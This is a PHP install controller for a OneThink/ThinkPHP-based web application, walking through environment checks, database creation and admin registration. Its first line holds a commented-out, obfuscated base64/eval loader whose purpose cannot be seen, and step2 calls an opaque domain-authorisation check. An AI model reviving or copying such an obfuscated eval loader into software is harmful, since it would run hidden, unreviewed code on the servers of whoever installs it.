<?php 
//$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0ianhlQmtTT1lNelpGdmhucUlwUHljcldtZndKUmJLdVZsb1h0UUFUQ0dORVVhSGdMZERzaVVJQVRuWUZ6ZHdxUXJmbHVvZ0p4dmlrWkxqZU9QaE1TcEN5Yk50R1JhV3NYQm1FVmNLSERKSzlqQm10V1JEOHJvUkhiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJLTkNyVnhUOG9zOU1xU09DQms1aW9RSEVTMFhFTjBRRm9zT0pvc3BYb3NnU1gxTkVTc2ZlR25IRVlTTkV5TjBoVng4RWh4MGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwV1JEOHJvbWpFTjI5akF5ZWdxMmYwb1JmVWhZdHhkS3N3b2FmMGNtdDZWeDkzYzN2TVAyNXBjYWZnUFpITXoyNEVOa0lIb21lZ3EyZjB2eFR4cXlXcHZscXBxUjRXUkQ4cm9SSGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYktOQ3JWeFQ4b3NRMWNhZnJ2VUNFNlB1WjVQMkc2b015NXpZL29LSTZjazl1QmtRNkJYVDJCeXRNdnlzTXoyOWJKRHQ4Qm1PMHZLQ3JWM2MzY3g1NkJsZ2djUjVVUFU0V1JEOHJvUkhiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJWWTBiVlkwYlZZMGJLTkNXUlo1ZlBrU3d2YVFVcVlUZVBsVzB6a0lIeXNXclBsT3hQMklIcXlvN0tOZzF2MlhFU2FmZ1BaYnZOMjlNY21lclBhSXB2VUhXUmxTd3FZVFhCYXBNQjFJc3pVSFdSRTBoejJJZnYzZEVZazV3Y2FRSFBzV3JQbE94UDJJSHF5b0VxeWYwcWs1bnZ4VEtQMjUwdlo5SFBhU3hBajBoS05DZXZtZXJjYVNVY2FTbm9hcTFQWlcwQms5TW9ROWdQWnAwQmtRSEJ5Z3BoUnA3S05DZVJrcFpobVdwdjNXZ1AyNENlM1cwcXl0bGhZdDlKRzBFUGxTSFBScDdLTkNlUk5ubmNhZmd2eDArdlpTbkJ5ZXB6M05DZTNXMHF5dElleG43S05DZVJ5MFdSRTBoUk5wZ3FEZmd2MTlaQmtJcGhzMUpPUVNkT1M5Tk5TT29vUjRFZTBPZmNhc3JCazV3Y2FRSFBSNUhQMldpZXhuZ0FqMGhSTm5lZW1PQ0J5ZGJKWlN4dlo5eGhSTHBiN1ZsTTQvWkRlS3BEZy9waUNsQ0M0eW5NQ1BwSG8vQ2xld0Nsb1ZsSDdybE01L3Jyb3dDaTdMbk1vM0NnQ21nZjQzcGdvM3BpQ2xDQzRYZmV4akVTWUVsWWs1bnF5RXJCazVucXlFbGhZbjdLTkNlUnkwV1JFcDlLTkNXUkVuclYra01EQURVZkFBSGlGWTRFRkJiZ0ErOFVGQlVFRkIxRCtEL25GRGZVRkJlRUZadkVGQUJmRkFGaStrREUrRE1yTUE5aUUwaFJ5VDF6WklnenhUWmNrNVVjYXByUERUd2NhU2pkWUVnQWowaFJOcHdxeVd3Qms5TWhSY3B2bGVydkR2SG9hcWZQbVdwaEdIV1JFMGhSTm5yVitBRmkra0RFK0JVRUZCMURqMGhSTm5ucWs1Mm9LMEV6MmZwejJiTHFrNTJoUm43S05DV1JFbmVWeC9sWjY3cHJxeVpwQ0xuTTdQQ2k3cnBmZ2xaQzRLWmJ6SFdSRW5lZWFPZ3ZacWdQYVhFSllUVUJhU1VCMTluQnllWkJrSXBoUm43S05DV1JFbmVWeC9wZjczWnBQS1pDNEtaYnpIV1JFbmVlYXExUFpkRUpZVFVCYVNVQjE5WmNrNVVoUm43S05DZVJOMGhSTnB3cXlXd0JrOU1oUmN3Y2FTamV4akVkWW43S05DV1JFbmVlbU9DQnlkYkpaUXd2MnBsUERFbHFrNTJleGpFZWFTTWNEbjdLTkNlUllPMEJhcHdWRzVmdjNXZ3EyNENlMk9ndlpxZ1BhWGxWUnRucWFweHFacEhxWW43S05DZVJZTzBCYXB3Vkc1ZnYzV2dxMjRDZTJxMVBaZGxWUnRucWxTTXp4bjdLTkNlUllPMEJhcHdWRzVuQnlXalBhUTVoUm43S05DZUxOMGhLTkNlVngvcGlDbENDNHlsaWh3bk1Dd1ppQnlycm93cERlcnBNN2lacFBLWlVCN3BNZ2RXUkVwamNrZUhCa2RFcWxTTXozT2dQMjRFdjNPcHZLb0NlYU9Eb0swRVBsU0hQUmpFZWFRblBrcE1vSzBFUGxTSFBScDdLTkNlUmtwWmhzcEd5MVRKWDFOZ0FqMGhSTm5lS05DZVJOcGdQWldIY2tPcG9SY1pjazVVY2FwclBENWpCbXRsRmowaFJObmVlbVhFSllUblAyMWZCazRDZVE5R09TZWtPU2VQZTBmWFNRVExZczlHU1JjY2hHSFdSRW5lUmtwWmhSTzFvSzA5b0tkZ0FqMGhSTm5lUllPMEJhcHdWRzVwdmxlcnZERWw1UDJHNXpaVzVxK0w1cVJXNWd4dTVDNm81ZzJLZXhuN0tOQ2VSTnA5cWtJd3FZVGdxREVuY1l0OUpZdHhoeUhXUkVuZVJObm5jYWZndngwK3F5ZXhQM29DZStrOW4ra2VVQWtMbCtrTlVBQmJDK2s0TUZZOXIrQVh1Rlk0aVl2Z0ZqMGhSTm5lTE4waFJObmVLTkNlUk5uclYrQlVFRkIxRCtBTUNBQU5mTWtPWkZZL0NBQlRpajBoUk5uZUJrekNva3B3eTJReHZaUTVoUk9mcWExZ1BEbkVMbWpFcWsxamNtbkNlYVFuUGtwTWt3VGNoWVQ4TFJUcFB5VDBBWUVuemtPYkJrNVBkUzBnb21JOG9hU2J2bU81aFJPZnFhMWdQcEh3eVluZ0FqMGhSTm5lUllPMEJhcHdWRzVwdmxlcnZERWw2aCszNUJhaTV6QnE1QjZkNWdrMDU2NmY1NVJhNXFhejVWK2Y1Q2FyZXhuN0tOQ2VSTnA5b2FTSHYyWEVCa3pDZWFRblBrcE1rd1Fjb1JzOW9ST2ZxYTFnUHBIeHlZcDdLTkNlUk5uZWVtT0NCeWRiSlpTeHZaOXhoUkxsQ0I3Q2l1R3BpNFBsQ29tcG5Dd3BpNFBsQ29tbk1vM25Nb0tDZjdObGhHSFdSRW5lUnkwRXFrSXdxWVQ3S05DZVJObmVlYXBNcVo4RUpZVGZ2bGVmQVlFZ0ZqMGhSTm5lUmtJZ3YzTkNlYXBNcVo5UGUzU3dxeWVNemsxcGUxMEhvUk9nUFpxcmt4Y2p6eVd3YzI5eHFSY2NWUnRuQms1WlAxSGx2WlNqenlXd2MyOXhxUmNjVlJ0bkJrNVpQMUhscWsxZkJramx5WW5XUkVuZVJObjlvUk9mcWExZ1BVSFdSRW5lUk5uclYrQThuK2tiWkZBTUNBQU5mTWtPWkZZL0NBQlRpajBoUk5uZVJ5V3B2M1dnUDI0Q2UyUW5Qa3BNeTJwTXFaOGxWUnRuQms1WlB4bjdLTkNlUk5wOUtOQ1dSRW5lUlk4cjV1RnQ1aWtWNWdrajVDMk01UHVHNnprVzU3Mk1LTkNlUk5wZ3FERWZCeVdMenlleHp5bkNlYU9EaFlUOExSVHBQeVQwQVlFbnFhZVBkUTBnb21JOG9SVHBQeVQwQVlFbnFhZVBkUzBnb21JOG9hU2J2bU81aFJPbnpwSHh5WW5FTG1qRXFrMWpjbW5DZWFPRGt3V2NoWXA3S05DZVJObmVlbU9DQnlkYkpaU3h2Wjl4aFJMQ2k3THBDQnJwZmdscGlDd1pwUEdsWkNHWnBQS1pVQjdwTWdKZ2Z6M2xyQjRsaEdIV1JFbmVSeTBFcWtJd3FZVDdLTkNlUk5uV1JFbmVSTm5uejI5TVBEdDlvYTE1djNRSHkyV3JQWjVwejNOQ2VhT0Rrd1FjVlJ0bnFhZVBkMTBIb1JPbnpwSDB5WW43S05DZVJObmVCa3pDZWFXclBaNGdBajBoUk5uZVJObm5Pc29FSllUZnZsZWZBWUVnRmowaFJObmVSTnBIQnlXMGhST3NOcEhsT3NlTFNRcE5PWWNjVlJ0bk9zZVBlME9SeTBmSlgxTmx5WWpFZXNPUmt4Y3NOcDlGTlgxUWUxMEhvUk9zTnBIbE9zZUxTU1dRWERjY1ZSdG5Pc2VQZTBPUnkxVHlPUmNjVnQwaFJObmVSTm5lb1JPc05wSGxPc2VMWHM5WVNSY2NWUnRuT3NlUGUwT1J5MVRZT1hxZWtSY2NoWXQ5b1JPbnpVSFdSRW5lUk5uZVZ4L2xyZUpwaXFVWnBQS1pVQjdwTWdKZ2Z6M2xyQjRXUkVuZVJObmV2MlN3djJwclBERWxxYWVMejI5TXFacGxleGpFZXNPUmhHSFdSRTBoUk5uZVJObnJWK2tvWitrN01NQlNIRkJXaU1rNm5qMGhSTm5lUk5ubnFhZU16azFwb0swRWVzT1JreGNzTnA5Rk5YMVFlMTA3S05DZVJObmVSeVNNdjJTMGhST3NOcEhsT3NlTEduUVdPWWNjaEdIV1JFbmVSTm5lZWFPRG9SdDlvc09ERlVnbHF5T2VQbFcwems1VXFZRW5Pc29nRmowaFJObmVSTm5udjNRSG9LMEVvbldZT1hRWE9ZVHNOU09UTm5RR09ZVGVPRFRGRzFORU9TZmVYMU9Hb2FUN2VhT0RQWlFicXkxRW9zT1FPblFTR1FORU4wZlRYblFLU3NTWW9RV1FTUlQxY2F6NG9VSFdSRW5lUk5uZWVhT0RWRzVwQWFTVWN5T3BoUk93dmtqZ29tSThvUk8wQmFwd1ZHNXB2bGVydkRFbnFhb2JKWmNwY3NTeHZaOXhoUm5nRmowaFJObmVSeTFwUG1XcEFqMGhSTm5lUk5ubmNhZmd2eDArcXlleFAzb0NlK0JTSEZCV2lNazZuK1pHck1CRmdBa25IQUQwZ0ErOEVZdmdGajBoUk5uZVJ5MFdSRW5lUk5uV1JFbmVSeTBXUkUwaFJObmVWeC9DYjdKQ3JCd3BEVktacFBLWlVCN3BNZ0pwaUNsQ0M0eWdDUHlnbEJvV1JFbmVSWU8wQmFwd1ZHNXdja1dVcXlXd2hSTENiN0pDckJ3cERWS1pwUEtaVUI3cE1nSnBpQ2xDQzR5Z0NQeWdsQm9mZXhJU2hSY3djYVNqZHh2Z2hHSFdSRW5lVng4ZWVtT0NCeWRiSmxlcHFhcHhxa1cwaFJjd2NhU2pkeHZnRmowaFJOcDlvYVNIdjJYRUFqMGhLTkNlUk5wd3F5V3dCazlNaFJjcHZsZXJ2RHZnb1J6Wm9STzBCYXB3Vkc1cHZsZXJ2REVsNTQ2cjVCaEs1dUZ0NWlrVjVpaGY1Z3hlNnpSQjZWK203N3hkNmgrMzZWUks1Z2swNTQ2cjVCaEs1cVJGNnpBVzZoK1M3N3hUZXhuN0tOQ1dSRW5lUllPd2NhU2pvSzBFdjJTd3YycHJQREVsdjNPcHZSdmdGajBoUk5uZUJrekNlbVcwcXl0RW9HMEVkWXRaZUR0bnYzT3B2UnRmSll0eGh5SFdSRW5lUk5ubmNhZmd2eDArdlpTbkJ5ZXB6M05DZTNXMHF5dElleG43S05DZVJOcDlLTkNlUk5uV1JFbmVSeVdwdjNXZ1AyNENlM1cwcXl0bFZSdHhoR0hXUkVuZVJZTzBCYXB3Vkc1bkJ5V2pQYVE1aFJuN0tOQ2VSeTBXUkVwOUtOQ1dSRW5yVitrTURBRFVmQUFIaUZZNERBQmJnQSs4VUZrTURBRFVmQUJTSEZCV2lNRGZ1Ris4VUZrb1orazdNTVpRVUFBOWlNQmtmK1k3YkUwaFJ5VDF6WklnenhUWmNrNVVjYXByUERUd2NhU2pkeEVnQWowaFJOcGdxRGZ3cXlXd0JrOU1oUmN3Y2FTamV4bkVvRzBFZERwN0tOQ2VSTm5uY2FmZ3Z4MCt2WlNuQnllcHozTkNlM1cwcXl0eGV4bjdLTkNlUnkwV1JFMGhSTm5uY2FmZ3Z4MCtxYXB3dmFJZkFZRWdGajBoS05DZVJZOHI2VitBNUM2cDVna2o1QzJNNVB1R0tOQ2VSWU9uelpXclBacWdxeHQ5b21XcHYzV2dQMjRDZTJPRHkyV3JQWnFncXh2Z0ZqMGhSTm5ucWFvRUpZVHN6VUM2cTJTMFlrNXdjYVFNejJYQ2VhT0R6MjlNcVpwbGhHSFdSRTBoUk5uclYra29aK2s3TU1CU0hGQldpTURmdXQwaFJOcFV2WlNmY2FTTGNhUURQYVN3aFJPbnpEakVlYU9EejI5TXFacGxreGNzTnA5TlhuU2FZU0VseVluN0tOQ1dSRW5lVngvWkg2VXBmQ3dwRGVycGc0cm5NaWlwTWVLcFU3dldSRW5lZWFRMWNhRUVvSzBFemxTZ1BhT0x6eVMwQlE5aXF5bkNoR0hXUkVuZWVhUW5Qa3BNb0swRXYyU3d2MnByUERFbHprT2JCazVMQms1WlB4dmdGajBoUk5weHFrY2d2M09wdnA5ZnFhMWdQWnB3Y21lZmNhOXhoUk9uekRqRWVhT0R6MjlNcVpwbGt4Y3NOcDlOWG5TYVlTRWx5WWpFZWFRblBrcE1WUnRuenlTMEJSbjdLTkNXUkVuZVZ4L3BEZXJwTTdpZ2Z6M2xyQjdacENMbk03eldSRW5lYzNlZ2NhU0x6MjlNcVpwbGhST256WldyUFpxZ3F4akVlYVExY2FFZ0ZqMGhLTkNlUmtwWmhtV3B2M1dnUDI0Q2UyU3h2Wjl4ZXhuZ0FqMGhSTm5lVng5d0JhOTN5MjF3cXhFZ0ZqMGhSTnA5b2FTSHYyWEVBajBoUk5uZXFhU0hPYXB4Tms1bk9acEhxWUVsWGxTTWNhcGJxWXZnRmowaFJObmV2MlN3djJwclBERWx2M09wdlJ2SG9LZGdGajBoUk5uZUtOQ2VSTm5uY2FmZ3Z4MCt2WlNuQnllcHozTkNlMHBNdjNPZlBhanJZazVucXlFcnoyOWJ2YUlwY2FYbGhHSFdSRW5lTE4waFJ5MFdSbDBXUkU9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs="));


// +----------------------------------------------------------------------
// | OneThink [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013 http://www.onethink.cn All rights reserved.
// +----------------------------------------------------------------------
// | Author: 麦当苗儿 <zuojiazi@vip.qq.com> <http://www.zjzit.cn>
// +----------------------------------------------------------------------

namespace Install\Controller;
use Think\Controller;
use Think\Db;

class InstallController extends Controller{

	protected function _initialize(){
		if(session('step') === null){
			$this->redirect('step1');
		}

		if(is_file(MODULE_PATH . 'Data/install.lock')){
			$this->error('已经成功安装了小蜜蜂系统，请不要重复安装!', U('Index/index'));
		}
	}

	//安装第一步，检测运行所需的环境设置
	public function step1(){
		session('error', false);

		//环境检测
		$env = check_env();

		//目录文件读写检测
		$dirfile = check_dirfile();

		//函数检测
		$func = check_func();
		
		session('step', 1);

		$this->assign('env', $env);
		$this->assign('dirfile', $dirfile);
		$this->assign('func', $func);
		$this->display();
	}

	//安装第二步，创建数据库
	public function step2($db = null, $admin = null){
		if(IS_POST){
			
			include 'function.php';
			$u = domain($_SERVER['HTTP_HOST']);
			if($u == 3){
				$this->error('当前域名未授权');
			}else if($u == 2){
				$this->error('当前域名正常使用中');
			}
			
			//检测管理员信息
			if(!is_array($admin) || empty($admin[0]) || empty($admin[1]) || empty($admin[3])){
				$this->error('请填写完整管理员信息');
			} else if($admin[1] != $admin[2]){
				$this->error('确认密码和密码不一致');
			} else {
				$info = array();
				list($info['username'], $info['password'], $info['repassword'], $info['email'])
				= $admin;
				//缓存管理员信息
				session('admin_info', $info);
			}

			//检测数据库配置
			if(!is_array($db) || empty($db[0]) ||  empty($db[1]) || empty($db[2]) || empty($db[3])){
				$this->error('请填写完整的数据库配置');
			} else {
			
				$conn = mysql_connect($db[1], $db[3], $db[4]);
				if($conn){
					$DB = array();
					list($DB['DB_TYPE'], $DB['DB_HOST'], $DB['DB_NAME'], $DB['DB_USER'], $DB['DB_PWD'],
						 $DB['DB_PORT'], $DB['DB_PREFIX']) = $db;
					//缓存数据库配置
					session('db_config', $DB);

					//创建数据库
					$dbname = $DB['DB_NAME'];
					unset($DB['DB_NAME']);
					$db  = Db::getInstance($DB);
					$sql = "CREATE DATABASE IF NOT EXISTS `{$dbname}` DEFAULT CHARACTER SET utf8";
					$db->execute($sql) || $this->error($db->getError());
				}else{
					$this->error('数据库链接失败！');
				}
				
			}

			//跳转到数据库安装页面
			$this->success('跳转到数据库安装页面!',U('step3'));
		//	$this->redirect('step3');
		} else {

			session('error') && $this->error('环境检测没有通过，请调整环境后重试！');

			$step = session('step');
			if($step != 1 && $step != 2){
				$this->redirect('step1');
			}
			
			session('step', 2);
			$this->display();
		}
	}

	//安装第三步，安装数据表，创建配置文件
	public function step3(){
		if(session('step') != 2){
			$this->redirect('step2');
		}

		$this->display();

		//连接数据库
		$dbconfig = session('db_config');
		$db = Db::getInstance($dbconfig);

		//创建数据表
		create_tables($db, $dbconfig['DB_PREFIX']);

		//注册创始人帐号
		$auth  = build_auth_key();
		$admin = session('admin_info');
		register_administrator($db, $dbconfig['DB_PREFIX'], $admin, $auth);

		//创建配置文件
		write_config($dbconfig, $auth);

		if(session('error')){
			//show_msg();
		} else {
			delDirAndFile('Runtime');
			session('step', 3);
			
			$this->redirect('Install/Index/complete');
		}
	}
}
 
 ?>